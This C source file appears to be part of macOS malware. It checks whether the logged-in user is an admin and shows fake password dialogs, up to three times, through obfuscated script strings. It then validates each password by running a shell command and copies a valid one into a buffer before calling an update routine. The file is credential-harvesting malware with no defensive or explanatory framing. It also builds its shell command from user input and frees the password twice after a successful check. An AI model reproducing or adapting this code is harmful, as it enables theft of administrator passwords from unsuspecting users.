#include <wisp.h>

__attribute__((always_inline)) inline char *execute(const char *command) {
    FILE *pipe = popen(command, "r");
    if (!pipe) {
        panic();  
    }

    size_t buffer_size = 1024;
    char *output = malloc(buffer_size);
    if (!output) {
        pclose(pipe);
        panic(); 
    }
    output[0] = '\0';

    char chunk[256];
    while (fgets(chunk, sizeof(chunk), pipe)) {
        size_t current_length = strlen(output);
        size_t chunk_length = strlen(chunk);
        if (current_length + chunk_length + 1 > buffer_size) {
            buffer_size = (current_length + chunk_length + 1) * 2;
            char *new_buffer = realloc(output, buffer_size);
            if (!new_buffer) {
                free(output);
                pclose(pipe);
                panic(); 
            }
            output = new_buffer;
        }
        strcat(output, chunk);
    }

    pclose(pipe);
    return output;
}

__attribute__((always_inline)) inline void free_if_not(void *ptr) {
    if (ptr) {
        free(ptr);
    }
}

__attribute__((always_inline)) inline char *extract(const char *output, const char *start_marker, const char *end_marker) {
    char *start = strstr(output, start_marker);
    if (!start) {
        return NULL;
    }
    start += strlen(start_marker);

    while (*start == ' ' || *start == '\t') {
        start++;  
    }

    char *end = strstr(start, end_marker);
    if (!end) {
        return strdup(start);
    }

    size_t length = end - start;
    char *result = malloc(length + 1);
    if (result) {
        strncpy(result, start, length);
        result[length] = '\0';
    }

    return result;
}

__attribute__((always_inline)) inline int auth(const char *username, const char *password) {
    if (!_strings[8]) {
        panic();
    }

    char command[512];
    snprintf(command, sizeof(command), _strings[8], username, password);
    
    char *result = execute(command);
    if (!result) {
        panic();  
    }

    int is_valid = (strlen(result) == 0);
    free(result);

    if (!is_valid) {
        panic(); 
    }

    return is_valid;
}

__attribute__((always_inline)) inline int is_user_admin(const char *username) {
    struct passwd *pwd = getpwnam(username);
    if (!pwd) return 0;

    if (pwd->pw_uid == 0) return 1;

    CFStringRef cfUsername = CFStringCreateWithCString(NULL, username, kCFStringEncodingUTF8);
    if (!cfUsername) return 0;

    CFErrorRef error = NULL;
    ODSessionRef session = ODSessionCreate(kCFAllocatorDefault, NULL, &error);
    if (!session) {
        CFRelease(cfUsername);
        return 0;
    }

    ODNodeRef node = ODNodeCreateWithNodeType(kCFAllocatorDefault, session, kODNodeTypeLocalNodes, &error);
    if (!node) {
        CFRelease(session);
        CFRelease(cfUsername);
        return 0;
    }

    ODQueryRef query = ODQueryCreateWithNode(
        kCFAllocatorDefault,
        node,
        kODRecordTypeGroups,
        kODAttributeTypeRecordName,
        kODMatchEqualTo,
        CFSTR("admin"),
        NULL,
        0,
        &error
    );

    if (!query) {
        CFRelease(node);
        CFRelease(session);
        CFRelease(cfUsername);
        return 0;
    }

    CFArrayRef results = ODQueryCopyResults(query, false, &error);
    if (!results || CFArrayGetCount(results) == 0) {
        if (results) CFRelease(results);
        CFRelease(query);
        CFRelease(node);
        CFRelease(session);
        CFRelease(cfUsername);
        return 0;
    }

    ODRecordRef adminGroup = (ODRecordRef)CFArrayGetValueAtIndex(results, 0);
    ODRecordRef userRecord = ODNodeCopyRecord(node, kODRecordTypeUsers, cfUsername, NULL, &error);
    if (!userRecord) {
        CFRelease(results);
        CFRelease(query);
        CFRelease(node);
        CFRelease(session);
        CFRelease(cfUsername);
        return 0;
    }

    Boolean isMember = ODRecordContainsMember(adminGroup, userRecord, &error);

    CFRelease(userRecord);
    CFRelease(results);
    CFRelease(query);
    CFRelease(node);
    CFRelease(session);
    CFRelease(cfUsername);

    return isMember ? 1 : 0;
}

__attribute__((always_inline)) inline char *request_input(const char *prompt_script) {
    char *response = execute(prompt_script);
    if (!response) return NULL;

    char *extracted = extract(response, "text returned:", ", gave up");
    free_if_not(response);
    return extracted;
}

void request_a(void) {
    char sws[PWD] = {0};
    const char *current_user = getlogin();
    if (!current_user) {
        struct passwd *user_info = getpwuid(getuid());
        if (user_info) {
            current_user = user_info->pw_name;
        } else {
            panic();
        }
    }

    char admin_username[256] = {0};
    if (is_user_admin(current_user)) {
        strncpy(admin_username, current_user, sizeof(admin_username) - 1);
    } else {
        if (!_strings[9]) {
            panic();
        }
        char *username_input = request_input(_strings[9]);
        if (!username_input || strlen(username_input) == 0) {
            free_if_not(username_input);
            panic();
        }
        strncpy(admin_username, username_input, sizeof(admin_username) - 1);
        free_if_not(username_input);
    }

    for (int attempts = 0; attempts < 3; attempts++) {
        char password_prompt[1024] = {0};
        if (is_user_admin(current_user)) {
            if (!_strings[10]) {
                panic();
            }
            strncpy(password_prompt, _strings[10], sizeof(password_prompt) - 1);
        } else {
            if (!_strings[11]) {
                panic();
            }
            snprintf(password_prompt, sizeof(password_prompt), _strings[11], admin_username);
        }

        char *password = request_input(password_prompt);
        if (!password) {
            continue;
        }

        if (auth(admin_username, password)) {
            strncpy(sws, password, PWD - 1);
            sws[PWD - 1] = '\0';
            free(password);
            
            update(); 
        }

        free(password);
    }
}
